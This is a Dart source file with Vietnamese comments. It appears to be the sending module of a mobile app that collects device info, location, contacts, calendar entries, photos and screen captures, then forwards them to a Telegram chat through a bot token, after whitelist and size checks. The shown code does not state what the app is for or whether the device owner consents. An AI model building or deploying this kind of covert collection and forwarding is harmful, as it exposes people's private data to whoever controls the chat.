import 'dart:io';

import '../constants/telegram_config.dart';
import '../network/telegram_client.dart';
import '../security/token_store.dart';
import 'send_result.dart';
import 'telegram_message_builder.dart';

/// Dieu phoi gui ket qua den Telegram.
///
/// La noi DUY NHAT quyet dinh gui van ban hay gui tep (SDS v4.0 Muc 6.4).
/// KHONG tu retry - tra SendResult va ket thuc; dispatcher quyet dinh thu lai.
/// KHONG ghi audit_log - viec do thuoc dispatcher (buoc 8).
/// Kiem tra whitelist TRUOC khi phat sinh bat ky request nao ra ngoai.
class TelegramResultSender {
  TelegramResultSender({
    required TelegramClient client,
    required TokenStore tokenStore,
    required TelegramMessageBuilder builder,
  })  : _client = client,
        _tokenStore = tokenStore,
        _builder = builder;

  final TelegramClient _client;
  final TokenStore _tokenStore;
  final TelegramMessageBuilder _builder;

  /// Kiem tra cau hinh TRUOC khi cham mang.
  ///
  /// Thu tu bat buoc: chat_id, whitelist, token.
  /// Kiem tra whitelist SAU khi da goi API la vo nghia: du lieu da ra khoi
  /// thiet bi va khong thu hoi duoc.
  ///
  /// Tra ve null neu cau hinh hop le.
  Future<SendResult?> _checkConfig() async {
    // 1a. chat_id.
    final String? chatId = await _tokenStore.readChatId();
    if (chatId == null || chatId.isEmpty) {
      return const SendResult(
        status: SendStatus.fatalConfig,
        description: 'chat_id chua duoc cau hinh',
      );
    }

    // 1b. whitelist - chan NGAY, KHONG phat sinh request.
    if (!TelegramConfig.isAllowedChat(chatId)) {
      return const SendResult(
        status: SendStatus.blocked,
        description: 'chat_id nam ngoai whitelist cua flavor dang chay',
      );
    }

    // 1c. token.
    final String? token = await _tokenStore.readBotToken();
    if (token == null || token.isEmpty) {
      return const SendResult(
        status: SendStatus.fatalAuth,
        description: 'Bot token chua duoc cau hinh',
      );
    }
    return null;
  }

  /// Gui mot goi ket qua da hoan tat.
  ///
  /// [payloadKind]  device_info | location | contacts | calendar | photo | screen
  /// [records]      moi phan tu la MOT ban ghi da format
  /// [filePath]     duong dan tep dinh kem, neu goi la dang tep
  Future<SendResult> send({
    required String sessionId,
    required String deviceId,
    required String payloadKind,
    required List<String> records,
    String? filePath,
    required DateTime collectedAt,
  }) async {
    // TRACH NHIEM 1: kiem tra cau hinh truoc khi cham mang.
    final SendResult? bad = await _checkConfig();
    if (bad != null) return bad;

    final String chatId = (await _tokenStore.readChatId())!;

    // Duong tep: chon phuong thuc theo bang SDS v4.0 Muc 6.4.
    if (filePath != null) {
      return _sendFile(
        chatId: chatId,
        filePath: filePath,
        payloadKind: payloadKind,
      );
    }

    // TRACH NHIEM 2: dung noi dung bang builder.
    final DateTime sentAt = DateTime.now().toUtc();
    final String header = _builder.buildHeader(
      deviceId: deviceId,
      sessionId: sessionId,
      collectedAt: collectedAt,
      sentAt: sentAt,
      payloadKind: payloadKind,
      recordCount: records.length,
    );
    // header ket thuc bang dai phan cach + \\n (writeln), nen than khong dinh.
    final String full = header + records.join('\\n');

    // Van ban ngan: mot tin nhan. Van ban dai: chia phan theo ranh gioi ban ghi.
    if (full.length <= TelegramConfig.maxMessageLength) {
      return _client.sendMessage(chatId: chatId, text: full);
    }

    final List<String> parts = _builder.splitIntoParts(
      records: records,
      maxLength: TelegramConfig.maxMessageLength,
      headerBuilder: (int i, int n) => _builder.buildHeader(
        deviceId: deviceId,
        sessionId: sessionId,
        collectedAt: collectedAt,
        sentAt: sentAt,
        payloadKind: payloadKind,
        recordCount: records.length,
        partIndex: i,
        partTotal: n,
      ),
    );
    return sendParts(
      sessionId: sessionId,
      deviceId: deviceId,
      payloadKind: payloadKind,
      parts: parts,
      collectedAt: collectedAt,
    );
  }

  /// Gui tep dinh kem, chon phuong thuc theo bang SDS v4.0 Muc 6.4.
  ///
  /// Duong anh: payloadKind la 'photo' hoac 'screen'.
  ///   size <= maxPhotoBytes -> sendPhoto
  ///   size >  maxPhotoBytes -> sendDocument (anh lon gui nhu tep)
  /// Duong tep: con lai.
  ///   size > maxUploadBytes -> oversize, KHONG goi API
  Future<SendResult> _sendFile({
    required String chatId,
    required String filePath,
    required String payloadKind,
  }) async {
    final File f = File(filePath);
    if (!f.existsSync()) {
      return const SendResult(
        status: SendStatus.fatalConfig,
        description: 'Khong tim thay tep dinh kem',
      );
    }
    final int size = f.lengthSync();

    final bool isImage = payloadKind == 'photo' || payloadKind == 'screen';
    if (isImage && size <= TelegramConfig.maxPhotoBytes) {
      return _client.sendPhoto(chatId: chatId, filePath: filePath);
    }
    // Anh lon hon 10 MB, hoac tep: kiem tra gioi han 50 MB TRUOC khi goi API.
    if (size > TelegramConfig.maxUploadBytes) {
      return const SendResult(
        status: SendStatus.oversize,
        description: 'Tep vuot 50 MB, khong the gui',
      );
    }
    return _client.sendDocument(chatId: chatId, filePath: filePath);
  }

  /// Gui nhieu phan khi goi phai chia nho.
  ///
  /// DUNG NGAY khi gap trang thai KHONG phai success - khong gui phan tiep theo.
  /// Ly do: gui roi rac lam goi kho truy vet, va dispatcher phai thu lai CA GOI.
  Future<SendResult> sendParts({
    required String sessionId,
    required String deviceId,
    required String payloadKind,
    required List<String> parts,
    required DateTime collectedAt,
  }) async {
    final SendResult? bad = await _checkConfig();
    if (bad != null) return bad;

    if (parts.isEmpty) {
      return const SendResult(
        status: SendStatus.fatalConfig,
        description: 'Khong co phan nao de gui',
      );
    }

    final String chatId = (await _tokenStore.readChatId())!;
    SendResult last = const SendResult(
      status: SendStatus.fatalConfig,
      description: 'Chua gui phan nao',
    );
    for (final String part in parts) {
      last = await _client.sendMessage(chatId: chatId, text: part);
      // Dung ngay neu phan nay khong thanh cong.
      if (last.status != SendStatus.success) return last;
    }
    return last;
  }
}
